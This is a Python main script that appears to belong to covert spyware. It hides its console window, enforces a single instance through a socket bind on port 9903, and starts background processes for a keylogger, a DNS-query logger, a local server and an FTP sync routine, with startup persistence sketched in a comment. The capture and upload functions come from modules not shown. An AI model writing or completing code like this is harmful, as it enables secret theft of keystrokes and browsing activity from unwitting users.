from utilities import dir_path, sync, server, hide_console 
from logger import key_logger, dns_logger
import os
import sys
import socket
import multiprocessing


def main():
    # add_startup() ++ import add_startup from utilities
    # disallowing multiple instance
    # Create a socket object
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Try to bind the socket to the port
    try:
        sock.bind(("", 9903))
    except socket.error:
        # If the port is already in use, exit the script
        sys.exit()

    dir_path()
    p1 = multiprocessing.Process(target=server, name="LocalServer")
    p2 = multiprocessing.Process(target=sync, name="SyncFtp")
    p3 = multiprocessing.Process(target=key_logger, name="KeyLogger")
    p4 = multiprocessing.Process(target=dns_logger, name="DNSQuaryLogger")
    p1.start()
    p2.start()
    p3.start()
    p4.start()
    p1.join()
    p2.join()
    p3.join()
    p4.join()

if __name__ == "__main__":
    # On Windows calling this function is necessary.
    multiprocessing.freeze_support()
    sys.tracebacklimit = 0
    hide_console()
    main()
    sys.tracebacklimit = 0

